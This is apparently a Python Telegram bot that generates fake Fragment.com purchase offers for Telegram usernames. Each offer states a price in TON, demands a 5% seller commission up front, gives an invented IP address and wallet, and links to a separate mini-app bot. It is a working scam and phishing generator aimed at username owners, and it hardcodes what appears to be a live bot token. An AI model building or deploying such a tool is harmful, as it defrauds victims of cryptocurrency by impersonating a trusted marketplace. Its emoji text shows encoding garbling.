import os
import time
import urllib.request
import json
import asyncio
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
FIXED_CHAT_ID = 511758924
PORT = int(os.getenv('PORT', 10000))
WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"

print(f"ü§ñ Fragment Deal Generator v3.1 - WEBHOOK FIXED")
print(f"üîë Token: ‚úÖ")
print(f"üéØ Chat ID: {FIXED_CHAT_ID}")
print(f"üåê Port: {PORT}")
print(f"üîó Webhook: {WEBHOOK_URL}")

# Variables globales
app = None
bot_status = "STARTING"
event_loop = None

# ===== PRIX TON =====
def get_ton_price():
    """Prix TON simplifi√©"""
    try:
        url = "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
        with urllib.request.urlopen(url, timeout=5) as response:
            data = json.loads(response.read().decode())
            return float(data.get('Price', 5.50))
    except:
        return 5.50

# ===== COMMANDES BOT =====
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /start"""
    print(f"üì• START command from user {update.effective_user.id}")
    
    try:
        user = update.effective_user
        chat_id = update.effective_chat.id
        
        message = f"""ü§ñ **Fragment Deal Generator v3.1**

Hello {user.first_name}! üëã

**Your Chat ID:** `{chat_id}`

**Commands:**
‚Ä¢ `/create username price` - Generate Fragment deal
‚Ä¢ `/help` - Show help

**Example:**
`/create crypto 1500`

‚úÖ **Bot is ready to work!**"""
        
        await update.message.reply_text(
            message,
            parse_mode='Markdown'
        )
        
        print(f"‚úÖ START response sent to {chat_id}")
        
    except Exception as e:
        print(f"‚ùå START error: {e}")
        try:
            await update.message.reply_text("‚ùå Error occurred, please try again.")
        except:
            pass

async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /create"""
    print(f"üì• CREATE command: {context.args}")
    
    try:
        if len(context.args) != 2:
            await update.message.reply_text(
                "‚ùå **Wrong format!**\n\n"
                "Use: `/create username price`\n"
                "Example: `/create crypto 1000`",
                parse_mode='Markdown'
            )
            return
        
        username = str(context.args[0]).strip().replace('@', '').upper()
        
        try:
            price = float(context.args[1])
        except ValueError:
            await update.message.reply_text("‚ùå Price must be a number!")
            return
        
        if price <= 0 or price > 1000000:
            await update.message.reply_text("‚ùå Price must be between 0 and 1,000,000 TON")
            return
        
        # Calculs
        commission = price * 0.05
        ton_price = get_ton_price()
        price_usd = price * ton_price
        commission_usd = commission * ton_price
        
        # Message Fragment
        fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:

‚Ä¢ Offer Amount: üíé{price:g} TON (${price_usd:.2f} USD)
‚Ä¢ Commission: üíé{commission:g} TON (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
‚Ä¢ Device: Safari on macOS  
‚Ä¢ IP Address: 103.56.72.245
‚Ä¢ Wallet: [EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U](https://tonviewer.com/EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U)

Important:
‚Ä¢ Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
‚Ä¢ If you choose not to proceed, simply ignore this message."""
        
        # Bouton
        button_url = f"https://t.me/BidRequestMiniApp_bot/WebApp?startapp={username.lower()}-{price:g}"
        keyboard = [[InlineKeyboardButton("View details", url=button_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Envoi
        await update.message.reply_text(
            fragment_message,
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
        
        # Confirmation
        await update.message.reply_text(
            f"‚úÖ **Deal Created!**\n\n"
            f"Username: @{username}\n"
            f"Price: {price:g} TON (${price_usd:.2f})\n"
            f"TON Price: ${ton_price:.2f}",
            parse_mode='Markdown'
        )
        
        print(f"‚úÖ Deal created: @{username} - {price} TON")
        
    except Exception as e:
        print(f"‚ùå CREATE error: {e}")
        try:
            await update.message.reply_text(f"‚ùå Error: {str(e)}")
        except:
            pass

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /help"""
    print(f"üì• HELP command from {update.effective_user.id}")
    
    help_text = """üìñ **Fragment Deal Generator Help**

**Commands:**
‚Ä¢ `/start` - Start the bot
‚Ä¢ `/create username price` - Create Fragment deal
‚Ä¢ `/help` - Show this help

**Examples:**
‚Ä¢ `/create crypto 1500`
‚Ä¢ `/create bitcoin 2000.5`

**Features:**
‚Ä¢ üíé Real-time TON price
‚Ä¢ üí∞ Automatic USD conversion  
‚Ä¢ üßÆ 5% commission calculation
‚Ä¢ üîó Clickable TON wallet
‚Ä¢ üì± Integrated WebApp button

‚úÖ **Ready to generate Fragment deals!**"""
    
    try:
        await update.message.reply_text(help_text, parse_mode='Markdown')
        print("‚úÖ HELP sent")
    except Exception as e:
        print(f"‚ùå HELP error: {e}")

# ===== TRAITEMENT UPDATES =====
def process_update_sync(update_data):
    """Traitement synchrone des updates"""
    try:
        print(f"üì° Processing webhook data...")
        
        # Cr√©ation de l'Update
        update = Update.de_json(update_data, app.bot)
        
        if update:
            print(f"üîÑ Update created: {update.update_id}")
            
            # Ex√©cution dans la boucle asyncio du thread bot
            future = asyncio.run_coroutine_threadsafe(
                app.process_update(update), 
                event_loop
            )
            
            # Attendre le r√©sultat avec timeout
            future.result(timeout=10)
            print(f"‚úÖ Update processed: {update.update_id}")
            return True
        else:
            print("‚ùå Failed to create Update object")
            return False
            
    except Exception as e:
        print(f"‚ùå Process update sync error: {e}")
        return False

# ===== SERVEUR WEBHOOK =====
class WebhookHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        """Traitement des webhooks Telegram"""
        try:
            print(f"üì® POST request: {self.path}")
            
            if self.path == f"/{BOT_TOKEN}":
                # Lecture du body
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length)
                
                print(f"üì° Webhook received: {len(post_data)} bytes")
                
                # Parse JSON
                try:
                    update_data = json.loads(post_data.decode('utf-8'))
                    print(f"üìã Update data keys: {list(update_data.keys())}")
                except json.JSONDecodeError as e:
                    print(f"‚ùå JSON decode error: {e}")
                    self.send_error(400, "Invalid JSON")
                    return
                
                # Traitement de l'update
                success = process_update_sync(update_data)
                
                # R√©ponse HTTP
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                
                response = {"ok": True, "processed": success}
                self.wfile.write(json.dumps(response).encode())
                
                print(f"‚úÖ Response sent: {response}")
                
            else:
                print(f"‚ùå Wrong path: {self.path}")
                self.send_error(404, "Path not found")
                
        except Exception as e:
            print(f"‚ùå Webhook error: {e}")
            try:
                self.send_error(500, f"Server error: {str(e)}")
            except:
                pass
    
    def do_GET(self):
        """Page de statut"""
        try:
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            
            # Informations de statut
            webhook_info = "Unknown"
            try:
                if app and hasattr(app, 'bot'):
                    # Note: On ne peut pas faire d'appel async ici
                    webhook_info = f"{WEBHOOK_URL}/{BOT_TOKEN}"
            except:
                pass
            
            html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Fragment Bot Status</title>
    <meta charset="utf-8">
    <style>
        body {{ font-family: Arial; margin: 40px; background: #f0f8ff; }}
        .container {{ max-width: 600px; margin: 0 auto; padding: 30px; 
                     background: white; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }}
        .status {{ color: #28a745; font-weight: bold; font-size: 18px; }}
        .info {{ background: #e7f3ff; padding: 15px; border-radius: 5px; margin: 15px 0; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>ü§ñ Fragment Deal Generator v3.1</h1>
        <p class="status">‚úÖ Status: {bot_status}</p>
        <div class="info">
            <p><strong>üîó Bot:</strong> Fragment Deal Generator</p>
            <p><strong>üì° Mode:</strong> Webhook</p>
            <p><strong>üåê System:</strong> Render Cloud</p>
            <p><strong>üïê Time:</strong> {time.strftime('%Y-%m-%d %H:%M:%S UTC')}</p>
            <p><strong>üíé Target Chat:</strong> {FIXED_CHAT_ID}</p>
            <p><strong>üîÑ Loop:</strong> {"Active" if event_loop and not event_loop.is_closed() else "Inactive"}</p>
        </div>
        <p><strong>Webhook URL:</strong> {webhook_info}</p>
        <p>Ready to generate Fragment deals! üöÄ</p>
        
        <div style="margin-top: 20px; padding: 10px; background: #f8f9fa; border-radius: 5px;">
            <p><strong>Test webhook:</strong></p>
            <code>curl -X POST {webhook_info} -H "Content-Type: application/json" -d '{{"test": true}}'</code>
        </div>
    </div>
</body>
</html>"""
            
            self.wfile.write(html.encode('utf-8'))
            
        except Exception as e:
            print(f"‚ùå GET error: {e}")
    
    def log_message(self, format, *args):
        """D√©sactiver les logs HTTP par d√©faut"""
        pass

# ===== SETUP BOT =====
async def setup_bot():
    """Setup du bot avec webhook"""
    global app, bot_status
    
    try:
        print("ü§ñ Creating bot application...")
        
        # Cr√©ation de l'application
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Ajout des handlers
        app.add_handler(CommandHandler("start", start_command))
        app.add_handler(CommandHandler("create", create_command))
        app.add_handler(CommandHandler("help", help_command))
        
        print("‚úÖ Handlers added")
        
        # Initialisation
        await app.initialize()
        print("‚úÖ Bot initialized")
        
        # Test de connexion
        bot_info = await app.bot.get_me()
        print(f"‚úÖ Connected to: @{bot_info.username} (ID: {bot_info.id})")
        
        # Configuration du webhook
        webhook_url = f"{WEBHOOK_URL}/{BOT_TOKEN}"
        
        try:
            # Suppression ancien webhook
            await app.bot.delete_webhook(drop_pending_updates=True)
            print("üóëÔ∏è Old webhook deleted")
        except Exception as e:
            print(f"‚ö†Ô∏è Delete webhook warning: {e}")
        
        # Attendre un peu
        await asyncio.sleep(1)
        
        # Configuration nouveau webhook
        await app.bot.set_webhook(url=webhook_url)
        print(f"üîó Webhook configured: {webhook_url}")
        
        # V√©rification
        webhook_info = await app.bot.get_webhook_info()
        print(f"üì° Webhook active: {webhook_info.url}")
        print(f"üìä Pending updates: {webhook_info.pending_update_count}")
        
        bot_status = "RUNNING"
        print("‚úÖ Bot ready!")
        
        return True
        
    except Exception as e:
        print(f"‚ùå Setup error: {e}")
        bot_status = f"ERROR: {str(e)}"
        return False

async def bot_loop():
    """Boucle principale du bot"""
    global event_loop
    
    try:
        print("üîÑ Starting bot loop...")
        
        # R√©cup√©rer la boucle courante
        event_loop = asyncio.get_running_loop()
        print(f"‚úÖ Event loop: {event_loop}")
        
        # Setup du bot
        success = await setup_bot()
        if not success:
            print("‚ùå Bot setup failed")
            return
        
        print("üéØ Bot configured successfully!")
        print("‚è≥ Waiting for webhooks...")
        
        # Boucle infinie pour maintenir le bot actif
        while True:
            await asyncio.sleep(30)  # Ping toutes les 30 secondes
            
            try:
                # Test p√©riodique de sant√©
                me = await app.bot.get_me()
                print(f"üíö Bot health check: @{me.username}")
            except Exception as e:
                print(f"‚ö†Ô∏è Health check failed: {e}")
        
    except Exception as e:
        print(f"‚ùå Bot loop error: {e}")
    
    finally:
        print("üîö Bot loop ended")

def run_bot():
    """Thread pour le bot"""
    try:
        print("üöÄ Bot thread starting...")
        asyncio.run(bot_loop())
    except Exception as e:
        print(f"‚ùå Bot thread error: {e}")

def run_server():
    """Serveur HTTP pour webhooks"""
    try:
        print(f"üåê Starting HTTP server on port {PORT}...")
        
        server = HTTPServer(('0.0.0.0', PORT), WebhookHandler)
        print(f"‚úÖ Server started: http://0.0.0.0:{PORT}")
        print(f"üîó Webhook endpoint: /{BOT_TOKEN}")
        
        server.serve_forever()
        
    except Exception as e:
        print(f"‚ùå Server error: {e}")
        raise

# ===== MAIN =====
def main():
    """Point d'entr√©e principal"""
    print("üöÄ Starting Fragment Deal Generator v3.1...")
    print("=" * 60)
    
    try:
        # D√©marrage du bot en thread s√©par√©
        bot_thread = threading.Thread(target=run_bot, daemon=True, name="BotThread")
        bot_thread.start()
        print("‚úÖ Bot thread started")
        
        # Attendre que le bot soit initialis√©
        time.sleep(5)
        
        # D√©marrage du serveur HTTP (blocking)
        print("üåê Starting HTTP server...")
        run_server()
        
    except KeyboardInterrupt:
        print("\nüõë Shutdown requested")
        
    except Exception as e:
        print(f"‚ùå MAIN ERROR: {e}")
        
    finally:
        print("üîö Application ended")

if __name__ == '__main__':
    main()
